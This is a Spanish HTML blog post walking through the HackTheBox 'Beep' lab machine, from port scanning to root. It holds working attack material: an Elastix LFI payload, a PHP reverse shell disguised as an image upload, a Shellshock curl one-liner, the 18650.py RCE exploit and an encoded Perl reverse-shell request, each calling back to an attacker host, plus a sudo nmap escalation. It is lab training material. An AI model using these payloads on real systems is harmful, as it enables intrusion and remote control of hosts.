<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HTB Beep - Bast1ant1c</title>
<meta name="description" content="Vamos a resolver la máquina Beep de HackTheBox. ¡Let’s hack!">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Bast1ant1c">
<meta property="og:title" content="HTB Beep">
<meta property="og:url" content="http://localhost:4000/beep/">


  <meta property="og:description" content="Vamos a resolver la máquina Beep de HackTheBox. ¡Let’s hack!">



  <meta property="og:image" content="http://localhost:4000/assets/images/beep/01-inicio.png">





  <meta property="article:published_time" content="2022-11-23T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/beep/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Bast1ant1c",
      "url": "http://localhost:4000/",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

<script src="/assets/js/codeblock.js"></script>
  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li><li class="masthead__menu-item">
              <a href="/" >Blog</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/halloffame/" >Hall of Fame</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Search</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000//" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">HTB Beep</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="BAST1ANT1C" itemprop="image" style="padding:25px;border:5px solid #434040;max-width:130px;border-radius:10%;">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">BAST1ANT1C</h3>
    
    
      <p class="author__bio" itemprop="description">
        Ethical hacker | eJPT | eCPPT
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      
        <li>
          <a href="https://github.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      
      
      
        <li>
          <a href="https://instagram.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      
        <li>
          <a href="https://tiktok.com/@bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-tiktok" aria-hidden="true"></i> TikTok
          </a>
        </li>
      
      
      

      

      

      



      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HTB Beep">
    <meta itemprop="description" content="Vamos a resolver la máquina Beep de HackTheBox. ¡Let’s hack!">
    <meta itemprop="datePublished" content="November 23, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HTB Beep
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-11-23T00:00:00-05:00">November 23, 2022 </time>&emsp;
          
          
        </p>
        <p style="text-align: center;">
<img src="/assets/images/beep/02-tarjeta.png" />
</p>

<p>¡Hola!
En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">beep</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>

<h2 id="preparación">PREPARACIÓN</h2>

<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">beep</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack beep
<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon 
</code></pre></div></div>

<h2 id="reconocimiento">RECONOCIMIENTO</h2>

<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.7

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...

<span class="o">[</span>+] 10.10.10.7 <span class="nv">ttl</span><span class="o">=</span>63 <span class="o">&gt;&gt;</span> Linux
</code></pre></div></div>

<p>Identificamos que es una maquina <strong>Linux</strong> debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>

<ul>
  <li>TTL =&gt; 64	Linux</li>
  <li>TTL =&gt; 128	Windows</li>
</ul>

<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.7 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
880/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
</code></pre></div></div>

<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,25,80,110,111,143,443,880,993,995,3306,4190,4445,4559,5038,10000 <span class="nt">-sCV</span> 10.10.10.7 <span class="nt">-oN</span> versions
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 <span class="o">(</span>DSA<span class="o">)</span>
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d <span class="o">(</span>RSA<span class="o">)</span>
25/tcp    open  smtp?
|_smtp-commands: Couldn<span class="s1">'t establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            877/udp   status
|_  100024  1            880/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-08-12T04:36:17+00:00; +4h48m04s from scanner time.
880/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql      MySQL (unauthorized)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 4h48m03s
</code></pre></div></div>

<h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>

<p>Iniciamos con el reconocimiento del puerto <code class="language-plaintext highlighter-rouge">80</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.7
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
http://10.10.10.7 <span class="o">[</span>302 Found] Apache[2.2.3], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)]</span>, IP[10.10.10.7], RedirectLocation[https://10.10.10.7/], Title[302 Found]
</code></pre></div></div>

<p>Inspeccionando las peticiones podemos ver un panel de login con el servicio <code class="language-plaintext highlighter-rouge">elastix</code>.</p>

<p style="text-align: center;">
<img src="/assets/images/beep/03-page.png" />
</p>

<p>Vamos a realizar fuzzing por medio de <code class="language-plaintext highlighter-rouge">wfuzz</code>, esta vez para encontrar rutas con posible contenido que pueda ser útil.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt httpS://10.10.10.7/FUZZ
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                 
<span class="o">=====================================================================</span>
000000047:   301        9 L      28 W       308 Ch      <span class="s2">"help"</span>                     
000000131:   301        9 L      28 W       311 Ch      <span class="s2">"modules"</span>    
000000002:   301        9 L      28 W       310 Ch      <span class="s2">"images"</span>                   
000000187:   301        9 L      28 W       308 Ch      <span class="s2">"mail"</span>                    
000000113:   301        9 L      28 W       310 Ch      <span class="s2">"themes"</span>
000000245:   301        9 L      28 W       309 Ch      <span class="s2">"admin"</span>
000000255:   301        9 L      28 W       310 Ch      <span class="s2">"static"</span>
000001184:   301        9 L      28 W       308 Ch      <span class="s2">"lang"</span>
000004689:   301        9 L      28 W       307 Ch      <span class="s2">"var"</span>
000005506:   301        9 L      28 W       309 Ch      <span class="s2">"panel"</span>
</code></pre></div></div>
<p>Al revisar los directorios, podemos identificar diferentes rutas que exponen la información sensible de los servicios encontrados, sin embargo, no se tiene éxito al conseguir una posible credencial del portal inicial, por tal razón buscamos exploits públicos que puedan tener relación con el servicio encontrado.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit elastix
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
Elastix 2.2.0 - <span class="s1">'graph.php'</span> Local File Inclusion | php/webapps/37637.pl
</code></pre></div></div>

<p>Se detecta el siguiente exploit que logra una exposición de información sensible a través del aprovechamiento por <code class="language-plaintext highlighter-rouge">LFI</code> o local file inclusión, el cual se identifica explorando el exploit encontrado.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> php/webapps/37637.pl
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Payload de explotación</span>
/vtigercrm/graph.php?current_language<span class="o">=</span>../../../../../../../..//etc/amportal.conf%00&amp;module<span class="o">=</span>Accounts&amp;action
</code></pre></div></div>

<p>El siguiente paso es ejecutar lo anterior junto con nuestro objetivo en el navegador, de la siguiente manera.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://10.10.10.7/vtigercrm/graph.php?current_language<span class="o">=</span>../../../../../../../..//etc/amportal.conf%00&amp;module<span class="o">=</span>Accounts&amp;action
</code></pre></div></div>

<p style="text-align: center;">
<img src="/assets/images/beep/04-page.png" />
</p>

<p>Esta máquina es bastante interesante por las diferentes maneras de llegar a realizar una intrusión en estos ejercicios, a continuación, vamos a ver algunas de estas.</p>

<h2 id="intrusion--escalada-de-privilegios-ssh">INTRUSION + ESCALADA DE PRIVILEGIOS SSH</h2>

<p>Iniciamos con <code class="language-plaintext highlighter-rouge">SSH</code>, debido a que tenemos acceso a contraseñas que pueden ser reutilizadas para acceder a la máquina por parte de un usuario administrador, así que básicamente vamos a ingresar con las credenciales que encontramos anteriormente y tenemos directamente acceso a una shell interactiva como usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@10.10.10.7
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultado</span>
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

ssh <span class="nt">-oKexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 root@10.10.10.7
root@10.10.10.7<span class="s1">'s password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
</span></code></pre></div></div>

<h2 id="intrusion-vtiger">INTRUSION VTIGER</h2>

<p>La segunda intrusión se lleva por medio del ataque por <code class="language-plaintext highlighter-rouge">LFI</code>, toda vez que, es identificado el servicio <code class="language-plaintext highlighter-rouge">vtiguer</code> como primera carpeta del payload ejecutado.</p>

<p>Logramos un acceso a un nuevo portal, por lo que vamos a probar las credenciales obtenidas, teniendo total capacidad de navegar en el servicio web.</p>

<p style="text-align: center;">
<img src="/assets/images/beep/05-page.png" />
</p>

<p>Realizamos la búsqueda de posibles vías de explotación en el portal, logrando ingresar a los detalles de la organización.</p>

<p style="text-align: center;">
<img src="/assets/images/beep/06-page.png" /> 
</p>

<p>En esta sección es posible subir archivos de extensión <code class="language-plaintext highlighter-rouge">JGP</code>, por lo que se procede a generar una shell en <code class="language-plaintext highlighter-rouge">PHP</code> de extensión <code class="language-plaintext highlighter-rouge">JGP</code> de la siguiente manera.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim shell.php.jgp
&lt;?php
	system<span class="o">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4564 &gt;/tmp/f"</span><span class="o">)</span>
?&gt;
</code></pre></div></div>

<p>Guardamos la shell y subimos el contenido donde se almacena la imagen de la organización, no sin antes ponernos en escucha por el puerto que asignamos en la <code class="language-plaintext highlighter-rouge">shell.php.jgp</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4564
</code></pre></div></div>

<p>Guardamos el archivo en la web y obtenemos una shell interactiva con el usuario <code class="language-plaintext highlighter-rouge">asterisk</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh-3.2<span class="nv">$ </span><span class="nb">whoami
</span>asterisk
</code></pre></div></div>

<h2 id="intrusion-webmin">INTRUSION WEBMIN</h2>

<p>Ingresamos al servicio alojado en el puerto <code class="language-plaintext highlighter-rouge">10000</code> y automáticamente detectamos una extensión <code class="language-plaintext highlighter-rouge">CGI</code>, lo que presuntamente puede ocasionar un ataque por <code class="language-plaintext highlighter-rouge">shellshock</code>, en esta ocasión la contraseña funcionó con el usuario <code class="language-plaintext highlighter-rouge">root</code> así como sucedió en la intrusión por <code class="language-plaintext highlighter-rouge">SSH</code>, logrando un mayor grado de enumeración de la máquina víctima.</p>

<p style="text-align: center;">
<img src="/assets/images/beep/07-page.png" />   
</p>

<p>Nos ponemos en escucha por medio de un listener.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4564
</code></pre></div></div>

<p>Ejecutamos el siguiente comando, habilitando comunicaciones con cifrados débiles y entablando una reverse shell por medio de una ejecución remota de comandos en el script <code class="language-plaintext highlighter-rouge">session_login.cgi</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--tlsv1</span>.0 <span class="nt">-sk</span> <span class="nt">-X</span> GET <span class="s2">"https://10.10.10.7:10000/session_login.cgi"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; };echo;echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/4564 0&gt;&amp;1"</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@beep webmin]# <span class="nb">whoami
</span>root
</code></pre></div></div>

<h2 id="intrusion-18650py">INTRUSION 18650.py</h2>

<p>Otro de los exploits públicos para <code class="language-plaintext highlighter-rouge">elastix</code> es ocasionado por una ejecución remota de comandos, por lo que vamos a utilizar el exploit <code class="language-plaintext highlighter-rouge">18650.py</code> para esta intrusión.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit elastix
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py
</code></pre></div></div>

<p>Descargamos el exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> php/webapps/18650.py
</code></pre></div></div>

<p>Este script de explotación requiere de 4 datos:</p>

<ul>
  <li>RHOST</li>
  <li>LHOST</li>
  <li>LPORT</li>
  <li>EXTENSIÓN</li>
</ul>

<p>El único dato que no conocemos es el número de extensión, por lo que vamos a hacer uso de la utilidad <code class="language-plaintext highlighter-rouge">svwar</code> para identificar la posible o posibles extensiones configuradas en la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svwar <span class="nt">-m</span> INVITE <span class="nt">-e100-999</span> 10.10.10.7
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
+-----------+----------------+
| Extension | Authentication |
+<span class="o">===========</span>+<span class="o">================</span>+
| 233       | reqauth        |
+-----------+----------------+
</code></pre></div></div>

<p>Modificamos el script con los datos solicitados anteriormente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim 18650.py
  <span class="nv">rhost</span><span class="o">=</span><span class="s2">"10.10.10.7"</span>
  <span class="nv">lhost</span><span class="o">=</span><span class="s2">"10.10.14.3"</span>
  <span class="nv">lport</span><span class="o">=</span>4564
  <span class="nv">extension</span><span class="o">=</span><span class="s2">"233"</span>
</code></pre></div></div>

<p>Para este ejercicio debemos configurar el archivo <code class="language-plaintext highlighter-rouge">/etc/ssl/openssl.cnf</code> para lograr comunicaciones por cifrados débiles de la siguiente manera.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/ssl/openssl.cnf
<span class="c">#MODIFICAR AL FINAL DEL ARCHIVO</span>
<span class="c">#MinProtocol = DEFAULT@SECLEVEL=2</span>
MinProtocol <span class="o">=</span> None
<span class="c">#CipherString = DEFAULT@SECLEVEL=2</span>
CipherString <span class="o">=</span> None
</code></pre></div></div>

<p>Nos ponemos ahora si en escucha.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4564
</code></pre></div></div>

<p>Ejecutamos el script con <code class="language-plaintext highlighter-rouge">python2</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 18650.py
</code></pre></div></div>

<p>Obtenemos una shell con el usuario <code class="language-plaintext highlighter-rouge">asterisk</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.7] 37775
<span class="nb">whoami
</span>asterisk
</code></pre></div></div>

<h2 id="intrusion-payload-de-18650py">INTRUSION PAYLOAD DE 18650.py</h2>

<p>Lo que realizamos es una variante del script anterior, detectando el tipo de solicitud que realiza a nivel web y modificando cada uno de los parámetros, agregando los permisos de ejecutar peticiones con cifrados débiles.</p>

<p>Creamos un listener.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4564
</code></pre></div></div>

<p>Ejecutamos la petición modificada.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--ciphers</span> DEFAULT@SECLEVEL<span class="o">=</span>1 <span class="nt">--tlsv1</span>.0 <span class="nt">-k</span> <span class="s2">"https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.3%3a4564%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"</span>
</code></pre></div></div>

<p>Obtenemos una shell con el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.7] 60412
<span class="nb">whoami
</span>asterisk
</code></pre></div></div>

<h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h2>

<p>Una vez que tenemos acceso a la máquina, realizamos el escalamiento de privilegios, en este caso, revisando los permisos a nivel de <code class="language-plaintext highlighter-rouge">sudo</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
User asterisk may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/yum
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/service
</code></pre></div></div>

<p><em>NOTA: Intenta realizar la escalada por cualquiera de estos 3 permisos a modo de ejercicio.</em></p>

<p>Se identifica que es posible ejecutar el comando <code class="language-plaintext highlighter-rouge">/usr/bin/nmap</code> con privilegios, por lo que vamos a hacer uso del escalamiento de <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a> obteniendo acceso al usuario <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Resultados</span>
Starting Nmap V. 4.11 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
</span>nmap&gt; <span class="o">!</span>sh
sh-3.2# <span class="nb">whoami
</span>root
</code></pre></div></div>

<h2 id="flags">FLAGS</h2>

<p>Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag <code class="language-plaintext highlighter-rouge">user</code> y <code class="language-plaintext highlighter-rouge">root</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#USER</span>
find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">head</span> <span class="nt">-c</span> 10<span class="p">;</span> <span class="nb">echo
</span>52143a2a96
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#ROOT</span>
find / <span class="nt">-name</span> root.txt 2&gt;/dev/null | xargs <span class="nb">head</span> <span class="nt">-c</span> 10<span class="p">;</span> <span class="nb">echo
</span>a896454076
</code></pre></div></div>

<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">beep</code> de HackTheBox!</p>

<p style="text-align: center;">
<img src="/assets/images/beep/08-finish.png" />
</p>

<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>

<p><strong>Nos vemos en otro bit.</strong>.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#beep" class="page__taxonomy-item" rel="tag">Beep</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-11-23T00:00:00-05:00">November 23, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/optimum/" class="pagination--pager" title="HTB Optimum
">Previous</a>
    
    
      <a href="/bastard/" class="pagination--pager" title="HTB bastard
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
<!--
